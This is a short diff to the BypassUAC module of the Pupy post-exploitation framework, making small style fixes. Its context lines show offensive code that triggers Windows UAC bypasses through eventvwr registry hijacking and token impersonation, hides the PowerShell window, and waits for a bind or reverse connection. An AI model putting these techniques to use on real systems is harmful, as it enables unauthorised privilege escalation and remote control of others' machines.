@@ -98,7 +98,7 @@ class BypassUAC(PupyModule):
         if not args.exe and not args.restart:
             clientConfToUse = None
             self.info('Using powershell payload')
-            if isBindLauncherForPs1 == True:
+            if isBindLauncherForPs1:
                 self.info("BIND launcher is on the target. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port")
                 self.info("Be careful, you have to choose a port which is not used on the target!")
                 listeningPort = -1
@@ -176,7 +176,7 @@ class BypassUAC(PupyModule):
         # Works from: Windows 7 (7600)
         # Fixed in: Windows 10 RS2 (15031)
         if method == "eventvwr":
-           self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_eventvwr(cmd, param)
+            self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_eventvwr(cmd, param)
 
         # Works from: Windows 10 TH1 (10240)
         # Unfixed
@@ -189,7 +189,7 @@ class BypassUAC(PupyModule):
             param = param.replace('-w hidden ', '')
             self.client.conn.modules["pupwinutils.bypassuac_token_imp"].run_bypass_uac_using_token_impersonation(cmd, param)
 
-        if isBindLauncherForPs1 == True:
+        if isBindLauncherForPs1:
             self.success("You have to connect to the target manually on {0}: try 'connect --host {0}' in pupy shell".format(listeningAddressPortForBindPs1))
         else:
             self.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
